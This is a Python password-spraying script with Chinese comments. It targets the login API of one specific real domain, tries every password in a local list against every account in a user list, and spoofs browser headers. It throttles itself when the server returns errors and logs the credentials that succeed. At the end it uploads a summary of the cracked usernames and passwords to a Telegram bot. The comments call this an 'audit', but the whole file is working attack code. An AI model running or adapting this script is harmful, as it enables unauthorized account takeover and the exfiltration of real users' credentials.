import os
import requests
import time

# 已更新为图片中的新目标网址
LOGIN_URL = "https://xn--4gq62f52gdss.com/api/v1/passport/auth/login"
BASE_DOMAIN = "https://xn--4gq62f52gdss.com"

USER_FIELD = "email"
PWD_FIELD = "password"
REQUEST_INTERVAL = 0.2
REQUEST_TIMEOUT = (3, 6)         # (连接超时秒数, 读取超时秒数)，防止服务器卡死不返回数据
MAX_RUNTIME_MINUTES = 350        # 全局最大运行时间（分钟），设为 0 或 None 表示不限制
INACTIVITY_TIMEOUT_MINUTES = 10  # 连续10分钟无新成果自动中断保护
RESULT_FILE_PATH = "success_log.txt"
SUMMARY_TXT_PATH = "success_summary.txt"

# ==================== Telegram 配置 ====================
TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "")
TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID", "")

def send_telegram_file(file_path):
    """直接将生成的 TXT 文件发送到 Telegram 聊天窗口"""
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        print("[!] 未配置 Telegram 密钥，跳过文件发送")
        return
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
    try:
        with open(file_path, "rb") as f:
            files = {"document": f}
            data = {"chat_id": TELEGRAM_CHAT_ID, "caption": "📁 *审计运行结果汇总文件*"}
            res = requests.post(url, data=data, files=files, timeout=10)
            if res.status_code == 200:
                print("[+] Telegram TXT 文件发送成功")
            else:
                print(f"[!] Telegram 文件发送失败，返回响应: {res.text}")
    except Exception as e:
        print(f"[!] Telegram 文件发送异常: {e}")

def get_accounts():
    """直接读取本地 users.txt 文件"""
    if os.path.exists("users.txt"):
        with open("users.txt", "r", encoding="utf-8") as f:
            return [line.strip() for line in f if line.strip() and not line.startswith("#")]
    return []

def get_passwords():
    """直接读取本地 passwords.txt 文件"""
    if os.path.exists("passwords.txt"):
        with open("passwords.txt", "r", encoding="utf-8") as f:
            return [line.strip() for line in f if line.strip() and not line.startswith("#")]
    return []

def is_login_success(response):
    """针对当前目标网站的成功判定逻辑"""
    if response.status_code != 200:
        return False
    try:
        data = response.json()
        if isinstance(data, dict):
            if "auth_data" in data or (isinstance(data.get("data"), dict) and "auth_data" in data["data"]):
                return True
            if data.get("status") == "success" or data.get("code") in [200, 0, "200", "success"]:
                return True
    except ValueError:
        pass
    text = response.text.lower()
    if "auth_data" in text or '"status":"success"' in text:
        return True
    return False

def main():
    usernames = get_accounts()
    passwords = get_passwords()
    
    if not usernames or not passwords:
        print("[!] 错误：未找到有效的账号字典(users.txt)或密码字典(passwords.txt)！")
        return

    # 运行前清理旧文件
    for path in [RESULT_FILE_PATH, SUMMARY_TXT_PATH]:
        if os.path.exists(path):
            os.remove(path)

    total_tasks = len(passwords) * len(usernames)
    print(f"[*] 全自动审计开始，共 {len(usernames)} 个账号，{len(passwords)} 个密码（总组合数: {total_tasks}）")
    print(f"[*] 模式: 密码优先（所有账号轮流尝试同一个密码）")
    print(f"[*] 目标: {LOGIN_URL}")
    if MAX_RUNTIME_MINUTES:
        print(f"[*] 全局超时限制: {MAX_RUNTIME_MINUTES} 分钟")
    if INACTIVITY_TIMEOUT_MINUTES:
        print(f"[*] 无新成果静默超时限制: {INACTIVITY_TIMEOUT_MINUTES} 分钟\n")
    else:
        print()

    successful_results = []
    start_time = time.time()
    last_success_time = start_time  # 记录上一次获取到成果的时间戳
    current_time_str = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
    
    current_count = 0
    consecutive_500_count = 0
    stop_reason = None

    with requests.Session() as session:
        # 设置适配新域名的浏览器 Header
        session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
            "Accept": "application/json, text/plain, */*",
            "Origin": BASE_DOMAIN,
            "Referer": f"{BASE_DOMAIN}/auth/login"
        })

        # 外层循环：先遍历密码
        for password in passwords:
            # 1. 检查全局运行时间
            if MAX_RUNTIME_MINUTES and (time.time() - start_time) > (MAX_RUNTIME_MINUTES * 60):
                stop_reason = f"已达到设定的最大运行时间 ({MAX_RUNTIME_MINUTES} 分钟)"
                break

            # 2. 检查无新成果静默超时
            if INACTIVITY_TIMEOUT_MINUTES and (time.time() - last_success_time) > (INACTIVITY_TIMEOUT_MINUTES * 60):
                stop_reason = f"超过 {INACTIVITY_TIMEOUT_MINUTES} 分钟未获取到新成果"
                break

            print(f"\n[*] ==================== 当前测试密码: {password} ====================")
            
            # 内层循环：让每个账号都来试这个密码
            for username in usernames:
                current_count += 1

                # 再次检查全局运行时间
                if MAX_RUNTIME_MINUTES and (time.time() - start_time) > (MAX_RUNTIME_MINUTES * 60):
                    stop_reason = f"已达到设定的最大运行时间 ({MAX_RUNTIME_MINUTES} 分钟)"
                    break

                # 再次检查无新成果静默超时
                if INACTIVITY_TIMEOUT_MINUTES and (time.time() - last_success_time) > (INACTIVITY_TIMEOUT_MINUTES * 60):
                    stop_reason = f"超过 {INACTIVITY_TIMEOUT_MINUTES} 分钟未获取到新成果"
                    break

                # 如果该账号已经成功匹配过，跳过后续测试，避免重复请求
                if any(res['username'] == username for res in successful_results):
                    continue

                # 计算百分比和动态耗时，采用单行动态刷新避免刷屏卡死
                percent = (current_count / total_tasks) * 100
                elapsed_seconds = int(time.time() - start_time)
                m, s = divmod(elapsed_seconds, 60)
                h, m = divmod(m, 60)
                time_str = f"{h:02d}:{m:02d}:{s:02d}"

                try:
                    # 使用 Form Data (data=payload) 提交
                    payload = {USER_FIELD: username, PWD_FIELD: password}
                    # 传入元组超时：(连接超时 3 秒, 读取/响应超时 6 秒)，防止服务器卡死不返回数据
                    response = session.post(LOGIN_URL, data=payload, timeout=REQUEST_TIMEOUT)

                    # 如果连续遇到 500 报错，自动暂停冷却 5 秒，防止把服务器彻底打死
                    if response.status_code == 500:
                        consecutive_500_count += 1
                        if consecutive_500_count >= 20:
                            print(f"\n[!] 连续遇到 500 报错，服务器压力大，自动冷却暂停 5 秒...")
                            time.sleep(5)
                            consecutive_500_count = 0
                    else:
                        consecutive_500_count = 0

                    # 单行动态刷新显示进度，不刷屏，避免手机/电脑终端卡死
                    print(f"\r[进度 {percent:.2f}%] [{time_str}] 账号:{username} | 状态:{response.status_code}   ", end="", flush=True)

                    if is_login_success(response):
                        print(f"\n\n[+] 【找到正确密码】 {username} -> {password}")
                        success_time = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
                        success_data = {
                            "username": username,
                            "password": password,
                            "time": success_time
                        }
                        successful_results.append(success_data)
                        
                        # 更新“最后获取到成果的时间戳”
                        last_success_time = time.time()
                        
                        # 记录到原始日志
                        with open(RESULT_FILE_PATH, "a", encoding="utf-8") as f:
                            f.write(f"[{success_time}] 成功: 账号={username} ---- 密码={password}\n")
                except requests.exceptions.Timeout:
                    print(f"\r[!] 账号 {username} 请求超时，已跳过" + " "*30)
                except requests.exceptions.RequestException as e:
                    print(f"\r[!] 请求异常: {e}" + " "*30)

                time.sleep(REQUEST_INTERVAL)

            if stop_reason:
                break

    print("\n")
    # === 全部跑完或触发中断后，统一生成汇总文件并无论如何都发送给电报 ===
    summary_content = "=== 审计结果汇总 ===\n\n"
    if stop_reason:
        summary_content += f"[!] 注意：脚本提前终止，原因：{stop_reason}。\n\n"
        print(f"[!] 主动中止审计，原因：{stop_reason}")
        
    if successful_results:
        for item in successful_results:
            summary_content += f"账号: {item['username']} | 密码: {item['password']} | 时间: {item['time']}\n"
    else:
        summary_content += f"审计完成时间: {current_time_str}\n状态: 本次未发现有效凭据。\n"
    
    # 写入汇总 TXT
    with open(SUMMARY_TXT_PATH, "w", encoding="utf-8") as f:
        f.write(summary_content)
        
    # 无论有无结果，都把这个 TXT 文件发送到电报
    send_telegram_file(SUMMARY_TXT_PATH)

    print(f"\n[*] 全自动审计结束，共找到 {len(successful_results)} 个有效凭据并已打包发送。")

if __name__ == "__main__":
    main()
